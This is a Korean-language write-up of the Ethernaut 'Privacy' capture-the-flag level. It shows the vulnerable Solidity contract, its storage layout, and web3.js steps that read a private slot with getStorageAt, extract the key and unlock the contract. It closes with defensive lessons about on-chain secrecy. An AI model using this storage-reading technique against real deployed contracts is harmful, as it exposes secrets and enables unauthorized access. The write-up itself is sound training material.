# Ethernaut Level 12 - Privacy

## 문제 설명

`private` 배열에 숨겨진 키를 읽어 컨트랙트 잠금을 해제하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) public {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}
```

---

## 취약점 분석

### Storage 레이아웃 분석

```
slot 0 : locked (bool, 1 byte)
slot 1 : ID (uint256, 32 bytes)
slot 2 : flattening(1) + denomination(1) + awkwardness(2) = 4 bytes (패킹)
slot 3 : data[0] (bytes32)
slot 4 : data[1] (bytes32)
slot 5 : data[2] (bytes32)  ← 여기서 키 추출
```

`unlock`의 키는 `bytes16(data[2])` = `data[2]`의 **앞 16바이트**

---

## 공격 단계

### Step 1 — slot 5 읽기

```js
let data = await web3.eth.getStorageAt(contract.address, 5)
// → "0x1234....(32바이트 hex)"
```

### Step 2 — 앞 16바이트 추출

```js
let key = data.slice(0, 34)
// "0x" + 32자(16바이트)
```

### Step 3 — unlock 호출

```js
await contract.unlock(key)
```

### Step 4 — 확인

```js
await contract.locked()
// → false
```

---

## 핵심 교훈

- 블록체인의 `private`은 외부 읽기를 막지 못함
- `getStorageAt`으로 스토리지 슬롯을 직접 읽는 것은 누구나 가능
- 민감한 데이터는 오프체인 또는 암호화 후 저장해야 함
